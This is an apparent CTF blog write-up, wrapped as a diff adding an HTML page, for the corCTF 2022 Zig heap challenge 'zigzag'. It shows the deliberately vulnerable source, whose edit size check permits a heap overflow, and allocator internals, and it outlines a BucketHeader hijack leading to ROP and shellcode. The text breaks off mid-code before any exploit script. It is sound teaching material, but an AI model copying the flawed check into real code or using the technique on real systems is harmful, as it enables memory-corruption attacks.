@@ -1,0 +1,656 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[corCTF 2022 - pwn] zigzag // ret2school</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8K5XT0SJN8"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8K5XT0SJN8', { 'anonymize_ip': false });
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[corCTF 2022 - pwn] zigzag"/>
+<meta name="twitter:description" content="Introduction zigzag is a zig heap challenge I did during the corCTF 2022 event. It was pretty exotic given we have to pwn a heap like challenge written in zig. It is not using the C allocator but instead it uses the GeneralPurposeAllocator, which makes the challenge even more interesting. Find the tasks here.
+TL; DR  Understanding zig GeneralPurposeAllocator internals Hiijack the BucketHeader of a given bucket to get a write what were / read what where primitive."/>
+
+    <meta property="og:title" content="[corCTF 2022 - pwn] zigzag" />
+<meta property="og:description" content="Introduction zigzag is a zig heap challenge I did during the corCTF 2022 event. It was pretty exotic given we have to pwn a heap like challenge written in zig. It is not using the C allocator but instead it uses the GeneralPurposeAllocator, which makes the challenge even more interesting. Find the tasks here.
+TL; DR  Understanding zig GeneralPurposeAllocator internals Hiijack the BucketHeader of a given bucket to get a write what were / read what where primitive." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/zigzag/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-08-08T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-08-08T00:00:00+00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <h1>ret2school</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             / 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/ret2school" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/ret2school_fr" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[corCTF 2022 - pwn] zigzag</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Aug 8, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          14 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/corctf/">corCTF</a>
+              <a class="tag" href="https://ret2school.github.io/tags/2022/">2022</a>
+              <a class="tag" href="https://ret2school.github.io/tags/heap/">heap</a>
+              <a class="tag" href="https://ret2school.github.io/tags/nasm/">nasm</a>
+              <a class="tag" href="https://ret2school.github.io/tags/pwn/">pwn</a>
+              <a class="tag" href="https://ret2school.github.io/tags/zig/">zig</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="introduction">Introduction</h2>
+<p><code>zigzag</code> is a zig heap challenge I did during the <a href="https://ctftime.org/event/1656">corCTF 2022</a> event. It was pretty exotic given we have to pwn a heap like challenge written in <a href="https://ziglang.org/">zig</a>. It is not using the C allocator but instead it uses the GeneralPurposeAllocator, which makes the challenge even more interesting. Find the tasks <a href="https://github.com/ret2school/ctf/tree/master/2022/corCTF/pwn/zieg">here</a>.</p>
+<h2 id="tl-dr">TL; DR</h2>
+<ul>
+<li>Understanding zig <code>GeneralPurposeAllocator</code> internals</li>
+<li>Hiijack the <code>BucketHeader</code> of a given bucket to get a write what were / read what where primitive.</li>
+<li>Leak stack + ROP on the fileRead function (mprotect + shellcode)</li>
+<li>PROFIT</li>
+</ul>
+<h2 id="source-code-analysis">Source code analysis</h2>
+<p>The source code is procided:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#6272a4">// zig build-exe main.zig -O ReleaseSmall
+</span><span style="color:#6272a4">// built with zig version: 0.10.0-dev.2959+6f55b294f
+</span><span style="color:#6272a4"></span>
+<span style="color:#ff79c6">const</span> std <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">@</span>import(<span style="color:#f1fa8c">&#34;std&#34;</span>);
+<span style="color:#ff79c6">const</span> fmt <span style="color:#ff79c6">=</span> std.fmt;
+
+<span style="color:#ff79c6">const</span> stdout <span style="color:#ff79c6">=</span> std.io.getStdOut().writer();
+<span style="color:#ff79c6">const</span> stdin <span style="color:#ff79c6">=</span> std.io.getStdIn();
+
+<span style="color:#ff79c6">const</span> MAX_SIZE: <span style="color:#8be9fd">usize</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x500</span>;
+<span style="color:#ff79c6">const</span> ERR: <span style="color:#8be9fd">usize</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xbaad0000</span>;
+<span style="color:#ff79c6">const</span> NULL: <span style="color:#8be9fd">usize</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xdead0000</span>;
+
+var chunklist: [<span style="color:#bd93f9">20</span>][]<span style="color:#8be9fd">u8</span> <span style="color:#ff79c6">=</span> undefined;
+
+var gpa <span style="color:#ff79c6">=</span> std.heap.GeneralPurposeAllocator(.{}){};
+<span style="color:#ff79c6">const</span> allocator <span style="color:#ff79c6">=</span> gpa.allocator();
+
+<span style="color:#ff79c6">pub</span> <span style="color:#ff79c6">fn</span> <span style="color:#50fa7b">menu</span>() <span style="color:#ff79c6">!</span>void {
+    <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;[1] Add\n&#34;</span>, .{});
+    <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;[2] Delete\n&#34;</span>, .{});
+    <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;[3] Show\n&#34;</span>, .{});
+    <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;[4] Edit\n&#34;</span>, .{});
+    <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;[5] Exit\n&#34;</span>, .{});
+    <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;&gt; &#34;</span>, .{});
+}
+
+<span style="color:#ff79c6">pub</span> <span style="color:#ff79c6">fn</span> <span style="color:#50fa7b">readNum</span>() <span style="color:#ff79c6">!</span><span style="color:#8be9fd">usize</span> {
+    var buf: [<span style="color:#bd93f9">64</span>]<span style="color:#8be9fd">u8</span> <span style="color:#ff79c6">=</span> undefined;
+    var stripped: []<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">u8</span> <span style="color:#ff79c6">=</span> undefined;
+    var amnt: <span style="color:#8be9fd">usize</span> <span style="color:#ff79c6">=</span> undefined;
+    var num: <span style="color:#8be9fd">usize</span> <span style="color:#ff79c6">=</span> undefined;
+
+    amnt <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> stdin.read(<span style="color:#ff79c6">&amp;</span>buf);
+    stripped <span style="color:#ff79c6">=</span> std.mem.trimRight(<span style="color:#8be9fd">u8</span>, buf[<span style="color:#bd93f9">0</span><span style="color:#ff79c6">..</span>amnt], <span style="color:#f1fa8c">&#34;\n&#34;</span>);
+
+    num <span style="color:#ff79c6">=</span> fmt.parseUnsigned(<span style="color:#8be9fd">usize</span>, stripped, <span style="color:#bd93f9">10</span>) catch {
+        <span style="color:#ff79c6">return</span> ERR;
+    };
+
+    <span style="color:#ff79c6">return</span> num;
+}
+
+<span style="color:#ff79c6">pub</span> <span style="color:#ff79c6">fn</span> <span style="color:#50fa7b">add</span>() <span style="color:#ff79c6">!</span>void {
+    var idx: <span style="color:#8be9fd">usize</span> <span style="color:#ff79c6">=</span> undefined;
+    var size: <span style="color:#8be9fd">usize</span> <span style="color:#ff79c6">=</span> undefined;
+
+    <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;Index: &#34;</span>, .{});
+    idx <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> readNum();
+
+    <span style="color:#ff79c6">if</span> (idx <span style="color:#ff79c6">==</span> ERR or idx <span style="color:#ff79c6">&gt;=</span> chunklist.len or <span style="color:#ff79c6">@</span>ptrToInt(chunklist[idx].ptr) <span style="color:#ff79c6">!=</span> NULL) {
+        <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;Invalid index!\n&#34;</span>, .{});
+        <span style="color:#ff79c6">return</span>;
+    }
+
+    <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;Size: &#34;</span>, .{});
+    size <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> readNum();
+
+    <span style="color:#ff79c6">if</span> (size <span style="color:#ff79c6">==</span> ERR or size <span style="color:#ff79c6">&gt;=</span> MAX_SIZE) {
+        <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;Invalid size!\n&#34;</span>, .{});
+        <span style="color:#ff79c6">return</span>;
+    }
+
+    chunklist[idx] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> allocator.alloc(<span style="color:#8be9fd">u8</span>, size);
+
+    <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;Data: &#34;</span>, .{});
+    _ <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> stdin.read(chunklist[idx]);
+}
+
+<span style="color:#ff79c6">pub</span> <span style="color:#ff79c6">fn</span> <span style="color:#50fa7b">delete</span>() <span style="color:#ff79c6">!</span>void {
+    var idx: <span style="color:#8be9fd">usize</span> <span style="color:#ff79c6">=</span> undefined;
+
+    <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;Index: &#34;</span>, .{});
+    idx <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> readNum();
+
+    <span style="color:#ff79c6">if</span> (idx <span style="color:#ff79c6">==</span> ERR or idx <span style="color:#ff79c6">&gt;=</span> chunklist.len or <span style="color:#ff79c6">@</span>ptrToInt(chunklist[idx].ptr) <span style="color:#ff79c6">==</span> NULL) {
+        <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;Invalid index!\n&#34;</span>, .{});
+        <span style="color:#ff79c6">return</span>;
+    }
+
+    _ <span style="color:#ff79c6">=</span> allocator.free(chunklist[idx]);
+
+    chunklist[idx].ptr <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">@</span>intToPtr([<span style="color:#ff79c6">*</span>]<span style="color:#8be9fd">u8</span>, NULL);
+    chunklist[idx].len <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+}
+
+<span style="color:#ff79c6">pub</span> <span style="color:#ff79c6">fn</span> <span style="color:#50fa7b">show</span>() <span style="color:#ff79c6">!</span>void {
+    var idx: <span style="color:#8be9fd">usize</span> <span style="color:#ff79c6">=</span> undefined;
+
+    <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;Index: &#34;</span>, .{});
+    idx <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> readNum();
+
+    <span style="color:#ff79c6">if</span> (idx <span style="color:#ff79c6">==</span> ERR or idx <span style="color:#ff79c6">&gt;=</span> chunklist.len or <span style="color:#ff79c6">@</span>ptrToInt(chunklist[idx].ptr) <span style="color:#ff79c6">==</span> NULL) {
+        <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;Invalid index!\n&#34;</span>, .{});
+        <span style="color:#ff79c6">return</span>;
+    }
+
+    <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;{s}\n&#34;</span>, .{chunklist[idx]});
+}
+
+<span style="color:#ff79c6">pub</span> <span style="color:#ff79c6">fn</span> <span style="color:#50fa7b">edit</span>() <span style="color:#ff79c6">!</span>void {
+    var idx: <span style="color:#8be9fd">usize</span> <span style="color:#ff79c6">=</span> undefined;
+    var size: <span style="color:#8be9fd">usize</span> <span style="color:#ff79c6">=</span> undefined;
+
+    <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;Index: &#34;</span>, .{});
+    idx <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> readNum();
+
+    <span style="color:#ff79c6">if</span> (idx <span style="color:#ff79c6">==</span> ERR or idx <span style="color:#ff79c6">&gt;=</span> chunklist.len or <span style="color:#ff79c6">@</span>ptrToInt(chunklist[idx].ptr) <span style="color:#ff79c6">==</span> NULL) {
+        <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;Invalid index!\n&#34;</span>, .{});
+        <span style="color:#ff79c6">return</span>;
+    }
+
+    <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;Size: &#34;</span>, .{});
+    size <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> readNum();
+
+    <span style="color:#ff79c6">if</span> (size <span style="color:#ff79c6">&gt;</span> chunklist[idx].len and size <span style="color:#ff79c6">==</span> ERR) {
+        <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;Invalid size!\n&#34;</span>, .{});
+        <span style="color:#ff79c6">return</span>;
+    }
+
+    chunklist[idx].len <span style="color:#ff79c6">=</span> size;
+
+    <span style="color:#ff79c6">try</span> stdout.print(<span style="color:#f1fa8c">&#34;Data: &#34;</span>, .{});
+    _ <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> stdin.read(chunklist[idx]);
+}
+
+<span style="color:#ff79c6">pub</span> <span style="color:#ff79c6">fn</span> <span style="color:#50fa7b">main</span>() <span style="color:#ff79c6">!</span>void {
+    var choice: <span style="color:#8be9fd">usize</span> <span style="color:#ff79c6">=</span> undefined;
+
+    <span style="color:#ff79c6">for</span> (chunklist) <span style="color:#ff79c6">|</span>_, i<span style="color:#ff79c6">|</span> {
+        chunklist[i].ptr <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">@</span>intToPtr([<span style="color:#ff79c6">*</span>]<span style="color:#8be9fd">u8</span>, NULL);
+        chunklist[i].len <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+    }
+
+    <span style="color:#ff79c6">while</span> (<span style="color:#ff79c6">true</span>) {
+        <span style="color:#ff79c6">try</span> menu();
+
+        choice <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> readNum();
+        <span style="color:#ff79c6">if</span> (choice <span style="color:#ff79c6">==</span> ERR) <span style="color:#ff79c6">continue</span>;
+
+        <span style="color:#ff79c6">if</span> (choice <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">try</span> add();
+        <span style="color:#ff79c6">if</span> (choice <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">2</span>) <span style="color:#ff79c6">try</span> delete();
+        <span style="color:#ff79c6">if</span> (choice <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">3</span>) <span style="color:#ff79c6">try</span> show();
+        <span style="color:#ff79c6">if</span> (choice <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">4</span>) <span style="color:#ff79c6">try</span> edit();
+        <span style="color:#ff79c6">if</span> (choice <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">5</span>) <span style="color:#ff79c6">break</span>;
+    }
+}
+</code></pre></div><p>The source code is quite readable, the vulnerability is the overflow within the <code>edit</code> function. The check onto the provided size isn&rsquo;t efficient, <code>size &gt; chunklist[idx].len and size == ERR</code>, if <code>size &gt; chunklist[idx].len</code> and if <code>size != ERR</code> the condition is false. Which means we can edit the chunk by writing an arbitrary amount of data in it.</p>
+<h2 id="generalpurposeallocator-abstract">GeneralPurposeAllocator abstract</h2>
+<p>The <a href="https://github.com/ziglang/zig/">zig</a> source is quite readable so let&rsquo;s take a look at the internals of the GeneralPurposeAllocator allocator.
+The GeneralPurposeAllocator is implemented <a href="https://github.com/ziglang/zig/blob/master/lib/std/heap/general_purpose_allocator.zig">here</a>.
+The header of the source code file gives the basic design of the allocator:</p>
+<pre tabindex="0"><code>//! ## Basic Design:
+//!
+//! Small allocations are divided into buckets:
+//!
+//! ```
+//! index obj_size
+//! 0     1
+//! 1     2
+//! 2     4
+//! 3     8
+//! 4     16
+//! 5     32
+//! 6     64
+//! 7     128
+//! 8     256
+//! 9     512
+//! 10    1024
+//! 11    2048
+//! ```
+//!
+//! The main allocator state has an array of all the &quot;current&quot; buckets for each
+//! size class. Each slot in the array can be null, meaning the bucket for that
+//! size class is not allocated. When the first object is allocated for a given
+//! size class, it allocates 1 page of memory from the OS. This page is
+//! divided into &quot;slots&quot; - one per allocated object. Along with the page of memory
+//! for object slots, as many pages as necessary are allocated to store the
+//! BucketHeader, followed by &quot;used bits&quot;, and two stack traces for each slot
+//! (allocation trace and free trace).
+//!
+//! The &quot;used bits&quot; are 1 bit per slot representing whether the slot is used.
+//! Allocations use the data to iterate to find a free slot. Frees assert that the
+//! corresponding bit is 1 and set it to 0.
+//!
+//! Buckets have prev and next pointers. When there is only one bucket for a given
+//! size class, both prev and next point to itself. When all slots of a bucket are
+//! used, a new bucket is allocated, and enters the doubly linked list. The main
+//! allocator state tracks the &quot;current&quot; bucket for each size class. Leak detection
+//! currently only checks the current bucket.
+//!
+//! Resizing detects if the size class is unchanged or smaller, in which case the same
+//! pointer is returned unmodified. If a larger size class is required,
+//! `error.OutOfMemory` is returned.
+//!
+//! Large objects are allocated directly using the backing allocator and their metadata is stored
+//! in a `std.HashMap` using the backing allocator.
+</code></pre><p>Let&rsquo;s take a look at <code>alloc</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#ff79c6">fn</span> <span style="color:#50fa7b">alloc</span>(self: <span style="color:#ff79c6">*</span>Self, len: <span style="color:#8be9fd">usize</span>, ptr_align: <span style="color:#50fa7b">u29</span>, len_align: <span style="color:#50fa7b">u29</span>, ret_addr: <span style="color:#8be9fd">usize</span>) Error<span style="color:#ff79c6">!</span>[]<span style="color:#8be9fd">u8</span> {
+    self.mutex.lock();
+    defer self.mutex.unlock();
+
+    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>self.isAllocationAllowed(len)) {
+        <span style="color:#ff79c6">return</span> error.OutOfMemory;
+    }
+
+    <span style="color:#ff79c6">const</span> new_aligned_size <span style="color:#ff79c6">=</span> math.max(len, ptr_align);
+    <span style="color:#ff79c6">if</span> (new_aligned_size <span style="color:#ff79c6">&gt;</span> largest_bucket_object_size) {
+        <span style="color:#ff79c6">try</span> self.large_allocations.ensureUnusedCapacity(self.backing_allocator, <span style="color:#bd93f9">1</span>);
+        <span style="color:#ff79c6">const</span> slice <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> self.backing_allocator.rawAlloc(len, ptr_align, len_align, ret_addr);
+
+        <span style="color:#ff79c6">const</span> gop <span style="color:#ff79c6">=</span> self.large_allocations.getOrPutAssumeCapacity(<span style="color:#ff79c6">@</span>ptrToInt(slice.ptr));
+        <span style="color:#ff79c6">if</span> (config.retain_metadata and <span style="color:#ff79c6">!</span>config.never_unmap) {
+            <span style="color:#6272a4">// Backing allocator may be reusing memory that we&#39;re retaining metadata for
+</span><span style="color:#6272a4"></span>            assert(<span style="color:#ff79c6">!</span>gop.found_existing or gop.value_ptr.freed);
+        } <span style="color:#ff79c6">else</span> {
+            assert(<span style="color:#ff79c6">!</span>gop.found_existing); <span style="color:#6272a4">// This would mean the kernel double-mapped pages.
+</span><span style="color:#6272a4"></span>        }
+        gop.value_ptr.bytes <span style="color:#ff79c6">=</span> slice;
+        <span style="color:#ff79c6">if</span> (config.enable_memory_limit)
+            gop.value_ptr.requested_size <span style="color:#ff79c6">=</span> len;
+        gop.value_ptr.captureStackTrace(ret_addr, .alloc);
+        <span style="color:#ff79c6">if</span> (config.retain_metadata) {
+            gop.value_ptr.freed <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">false</span>;
+            <span style="color:#ff79c6">if</span> (config.never_unmap) {
+                gop.value_ptr.ptr_align <span style="color:#ff79c6">=</span> ptr_align;
+            }
+        }
+
+        <span style="color:#ff79c6">if</span> (config.verbose_log) {
+            log.info(<span style="color:#f1fa8c">&#34;large alloc {d} bytes at {*}&#34;</span>, .{ slice.len, slice.ptr });
+        }
+        <span style="color:#ff79c6">return</span> slice;
+    }
+
+    <span style="color:#ff79c6">const</span> new_size_class <span style="color:#ff79c6">=</span> math.ceilPowerOfTwoAssert(<span style="color:#8be9fd">usize</span>, new_aligned_size);
+    <span style="color:#ff79c6">const</span> ptr <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> self.allocSlot(new_size_class, ret_addr);
+    <span style="color:#ff79c6">if</span> (config.verbose_log) {
+        log.info(<span style="color:#f1fa8c">&#34;small alloc {d} bytes at {*}&#34;</span>, .{ len, ptr });
+    }
+    <span style="color:#ff79c6">return</span> ptr[<span style="color:#bd93f9">0</span><span style="color:#ff79c6">..</span>len];
+}
+</code></pre></div><p>First in <code>alloc</code>, if the aligned size is not larger than the largest bucket capacity (2**11) it will call <code>allocSlot</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#ff79c6">fn</span> <span style="color:#50fa7b">allocSlot</span>(self: <span style="color:#ff79c6">*</span>Self, size_class: <span style="color:#8be9fd">usize</span>, trace_addr: <span style="color:#8be9fd">usize</span>) Error<span style="color:#ff79c6">!</span>[<span style="color:#ff79c6">*</span>]<span style="color:#8be9fd">u8</span> {
+    <span style="color:#ff79c6">const</span> bucket_index <span style="color:#ff79c6">=</span> math.log2(size_class);
+    <span style="color:#ff79c6">const</span> first_bucket <span style="color:#ff79c6">=</span> self.buckets[bucket_index] orelse <span style="color:#ff79c6">try</span> self.createBucket(
+        size_class,
+        bucket_index,
+    );
+    var bucket <span style="color:#ff79c6">=</span> first_bucket;
+    <span style="color:#ff79c6">const</span> slot_count <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">@</span>divExact(page_size, size_class);
+    <span style="color:#ff79c6">while</span> (bucket.alloc_cursor <span style="color:#ff79c6">==</span> slot_count) {
+        <span style="color:#ff79c6">const</span> prev_bucket <span style="color:#ff79c6">=</span> bucket;
+        bucket <span style="color:#ff79c6">=</span> prev_bucket.next;
+        <span style="color:#ff79c6">if</span> (bucket <span style="color:#ff79c6">==</span> first_bucket) {
+            <span style="color:#6272a4">// make a new one
+</span><span style="color:#6272a4"></span>            bucket <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> self.createBucket(size_class, bucket_index);
+            bucket.prev <span style="color:#ff79c6">=</span> prev_bucket;
+            bucket.next <span style="color:#ff79c6">=</span> prev_bucket.next;
+            prev_bucket.next <span style="color:#ff79c6">=</span> bucket;
+            bucket.next.prev <span style="color:#ff79c6">=</span> bucket;
+        }
+    }
+    <span style="color:#6272a4">// change the allocator&#39;s current bucket to be this one
+</span><span style="color:#6272a4"></span>    self.buckets[bucket_index] <span style="color:#ff79c6">=</span> bucket;
+
+    <span style="color:#ff79c6">const</span> slot_index <span style="color:#ff79c6">=</span> bucket.alloc_cursor;
+    bucket.alloc_cursor <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>;
+
+    var used_bits_byte <span style="color:#ff79c6">=</span> bucket.usedBits(slot_index <span style="color:#ff79c6">/</span> <span style="color:#bd93f9">8</span>);
+    <span style="color:#ff79c6">const</span> used_bit_index: <span style="color:#50fa7b">u3</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">@</span>intCast(u3, slot_index <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">8</span>); <span style="color:#6272a4">// TODO cast should be unnecessary
+</span><span style="color:#6272a4"></span>    used_bits_byte.<span style="color:#ff79c6">*</span> <span style="color:#ff79c6">|=</span> (<span style="color:#ff79c6">@</span><span style="color:#ff79c6">as</span>(<span style="color:#8be9fd">u8</span>, <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">&lt;&lt;</span> used_bit_index);
+    bucket.used_count <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>;
+    bucket.captureStackTrace(trace_addr, size_class, slot_index, .alloc);
+    <span style="color:#ff79c6">return</span> bucket.page <span style="color:#ff79c6">+</span> slot_index <span style="color:#ff79c6">*</span> size_class;
+}
+</code></pre></div><p><code>allocSlot</code> will check if the current bucket is able to allocate one more object, else it will iterate through the doubly linked list to look for a not full bucket.
+And if it does nto find one, it creates a new bucket. When the bucket is allocated, it returns the available objet at <code>bucket.page + slot_index * size_class</code>.</p>
+<p>As you can see, the <code>BucketHeader</code> is structured like below in the <code>createBucket</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-rust" data-lang="rust"><span style="color:#ff79c6">fn</span> <span style="color:#50fa7b">createBucket</span>(self: <span style="color:#ff79c6">*</span>Self, size_class: <span style="color:#8be9fd">usize</span>, bucket_index: <span style="color:#8be9fd">usize</span>) Error<span style="color:#ff79c6">!*</span>BucketHeader {
+    <span style="color:#ff79c6">const</span> page <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> self.backing_allocator.allocAdvanced(<span style="color:#8be9fd">u8</span>, page_size, page_size, .exact);
+    errdefer self.backing_allocator.free(page);
+
+    <span style="color:#ff79c6">const</span> bucket_size <span style="color:#ff79c6">=</span> bucketSize(size_class);
+    <span style="color:#ff79c6">const</span> bucket_bytes <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">try</span> self.backing_allocator.allocAdvanced(<span style="color:#8be9fd">u8</span>, <span style="color:#ff79c6">@</span>alignOf(BucketHeader), bucket_size, .exact);
+    <span style="color:#ff79c6">const</span> ptr <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">@</span>ptrCast(<span style="color:#ff79c6">*</span>BucketHeader, bucket_bytes.ptr);
+    ptr.<span style="color:#ff79c6">*</span> <span style="color:#ff79c6">=</span> BucketHeader{
+        .prev <span style="color:#ff79c6">=</span> ptr,
+        .next <span style="color:#ff79c6">=</span> ptr,
+        .page <span style="color:#ff79c6">=</span> page.ptr,
+        .alloc_cursor <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>,
+        .used_count <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>,
+    };
+    self.buckets[bucket_index] <span style="color:#ff79c6">=</span> ptr;
+    <span style="color:#6272a4">// Set the used bits to all zeroes
